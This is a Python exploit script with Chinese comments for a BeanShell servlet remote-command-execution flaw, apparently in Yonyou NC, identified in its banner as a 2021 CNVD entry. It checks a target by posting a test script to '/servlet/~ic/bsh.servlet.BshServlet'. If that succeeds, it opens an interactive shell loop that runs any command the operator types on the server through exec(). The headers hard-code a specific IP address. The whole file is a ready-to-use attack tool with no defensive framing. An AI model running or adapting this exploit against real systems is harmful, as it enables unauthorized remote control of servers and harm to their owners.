# 函数的入口
import argparse, requests, sys, json, re ,os

# 导入URL判断函数
from urllib.parse import urlparse

# 关闭警告
requests.packages.urllib3.disable_warnings()


# 定义字符画
def banner():
    test = """   ___     __         ___     ____   ___ ____  _      _____  ___  _  __ _____ 
  / __\ /\ \ \/\   /\/   \   |___ \ / _ \___ \/ |    |___ / / _ \/ |/ /|___  |
 / /   /  \/ /\ \ / / /\ /____ __) | | | |__) | |_____ |_ \| | | | | '_ \ / / 
/ /___/ /\  /  \ V / /_//_____/ __/| |_| / __/| |_____|__) | |_| | | (_) / /  
\____/\_\ \/    \_/___,'     |_____|\___/_____|_|    |____/ \___/|_|\___/_/   
                                                                              
 """
    print(test)


# 定义主函数
def main():

    # 实例化
    parser = argparse.ArgumentParser(
        description="Example: python {0} -t url -o result.txt ".format(
            os.path.basename(sys.argv[0])
        )
    )

    # 添加参数
    # -u 接收单个URL链接
    parser.add_argument("-t", "--target", dest="t", type=str, help="指定目标URL")

    # 调用
    args = parser.parse_args()

    # 判断传入的是否是一个url
    if not is_valid_url(args.t):
        print("错误：'{}' 不是一个有效的URL.".format(args.t))
        print("若您不确定，可参照：")
        print(
            "Usag:\n\t python {0} -t http://www.baidu.com ".format(
                os.path.basename(sys.argv[0]))
            )
    else:
        poc(args.t)


def poc(target):

    # 定义payload
    payload = "/servlet/~ic/bsh.servlet.BshServlet"

    # 定义headers
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Connection": "close",
    }

    # 捕捉异常
    try:
        res = requests.get(
            url=target + payload, headers=headers, verify=False, timeout=9
        )

        if res.status_code == 200:

            headers = {
                "Content-Length": "39",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "http://175.148.126.32:8000",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Referer": "http://175.148.126.32:8000/servlet/~ic/bsh.servlet.BshServlet",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "Connection": "close",
            }

            data = "bsh.script=print%28%22hello%21%22%29%3B"

            res = requests.post(
                url=target + payload,
                headers=headers,
                data=data,
                verify=False,
                timeout=9,
            )

        # 将读到的内容转为 json/dict 格式
        # res = json.loads(res.text)

        # 正则表达式
        pattern = r"<pre>.*?</pre>"
        # 匹配正则表达式
        match = re.findall(pattern, res.text, re.DOTALL)

        if match and "hello!" in match[0]:
            print("[+] {0} 存在漏洞！！".format(target))
            exp(target)

        else:
            print("[-] {0} ".format(target))

    except Exception:
        print(f"连接异常：{target}")
        return


def is_valid_url(url):
    """
    检查给定的字符串是否是一个有效的URL。

    参数:
    url (str): 要检查的URL字符串。

    返回值:
    bool: 如果给定的字符串是一个有效的URL，则返回True；否则返回False。
    """
    try:
        # 使用urlparse模块解析URL
        result = urlparse(url)

        # 检查URL是否具有scheme和netloc（网络位置，通常是域名）
        return all([result.scheme, result.netloc])

    except ValueError:
        # 如果解析过程中出现错误（例如，字符串不是一个有效的URL格式），返回False
        return False


# 定义exp函数
def exp(target):
    while True:
        command = input("请输入要执行的命令(输入quit退出)：")

        if command == "quit":
            break

        # 定义 Payload
        payload = "/servlet/~ic/bsh.servlet.BshServlet"

        # 定义 Headers
        headers = {
            "Content-Length": "39",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "http://175.148.126.32:8000",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "http://175.148.126.32:8000/servlet/~ic/bsh.servlet.BshServlet",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Connection": "close",
        }

        # 定义要发送的命令
        data = 'bsh.script=exec("' + command + '");'

        try:
            # 以 POST 方式进行请求
            res = requests.post(
                url=target + payload,
                headers=headers,
                data=data,
                verify=False,
                timeout=9,
            )

            # 正则表达式
            pattern = r"<pre>(.*?)</pre>"
            # 匹配正则表达式
            match = re.findall(pattern, res.text, re.DOTALL)

            print(match[0].strip() + "\n")
        except:
            print("执行命令错误")
            pass


# 函数的入口
if __name__ == "__main__":
    banner()
    main()
